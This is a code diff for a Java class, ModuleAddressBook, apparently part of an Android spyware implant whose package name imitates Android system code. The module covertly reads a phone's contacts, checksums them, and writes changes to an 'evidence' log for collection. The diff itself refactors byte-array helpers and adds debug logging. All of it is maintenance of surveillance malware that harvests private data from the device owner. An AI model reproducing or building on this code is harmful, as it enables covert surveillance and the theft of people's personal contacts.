@@ -4,31 +4,22 @@ import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.util.Date;
 import java.util.HashMap;
-import java.util.HashSet;
 import java.util.List;
 import java.util.ListIterator;
 
-import android.content.ContentResolver;
-import android.content.Context;
-import android.database.Cursor;
-import android.net.Uri;
-
 import com.android.networking.LogR;
-import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfModule;
 import com.android.networking.crypto.Digest;
-import com.android.networking.crypto.Encryption;
 import com.android.networking.evidence.EvidenceType;
 import com.android.networking.evidence.Markup;
 import com.android.networking.module.task.Contact;
 import com.android.networking.module.task.PhoneInfo;
 import com.android.networking.module.task.PickContact;
 import com.android.networking.module.task.UserInfo;
+import com.android.networking.util.ByteArray;
 import com.android.networking.util.Check;
 import com.android.networking.util.DataBuffer;
-import com.android.networking.util.DateTime;
-import com.android.networking.util.Utils;
 import com.android.networking.util.WChar;
 
 public class ModuleAddressBook extends BaseModule {
@@ -84,7 +75,7 @@ public class ModuleAddressBook extends BaseModule {
 			serializeContacts();
 		}else{
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (actualStart): got serialized contacs from markup");
+				Check.log(TAG + " (actualStart), got serialized contacs from markup: " + contacts.size());
 			}
 		}
 
@@ -169,7 +160,7 @@ public class ModuleAddressBook extends BaseModule {
 			// calculate the crc of the contact
 			final byte[] packet = preparePacket(c);
 			// if(Cfg.DEBUG) Check.log( TAG + " (go): "  ;//$NON-NLS-1$
-			// Utils.byteArrayToHex(packet));
+			// ByteArray.byteArrayToHex(packet));
 			final Long crcOld = contacts.get(c.getId());
 			final Long crcNew = Digest.CRC32(packet);
 			// if(Cfg.DEBUG) Check.log( TAG + " (go): " + crcOld + " <-> "  ;//$NON-NLS-1$
@@ -185,12 +176,15 @@ public class ModuleAddressBook extends BaseModule {
 				log.write(packet);
 				
 				needToSerialize = true;
-				Thread.yield();
+				//Thread.yield();
 			}						
 		}
 		
 		log.close();
 
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (contacts), needto needToSerialize: " + needToSerialize);
+		}
 		return needToSerialize;
 	}
 
@@ -218,9 +212,9 @@ public class ModuleAddressBook extends BaseModule {
 		final ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
 		// Adding header
 		try {
-			outputStream.write(Utils.intToByteArray(0)); // size
-			outputStream.write(Utils.intToByteArray(version));
-			outputStream.write(Utils.intToByteArray((int) uid));
+			outputStream.write(ByteArray.intToByteArray(0)); // size
+			outputStream.write(ByteArray.intToByteArray(version));
+			outputStream.write(ByteArray.intToByteArray((int) uid));
 		} catch (IOException ex) {
 			if (Cfg.EXCEPTION) {
 				Check.log(ex);
@@ -257,7 +251,7 @@ public class ModuleAddressBook extends BaseModule {
 			final int header = (type << 24) | (name.length() * 2);
 
 			try {
-				outputStream.write(Utils.intToByteArray(header));
+				outputStream.write(ByteArray.intToByteArray(header));
 				outputStream.write(WChar.getBytes(name, false));
 			} catch (final IOException e) {
 				if (Cfg.EXCEPTION) {
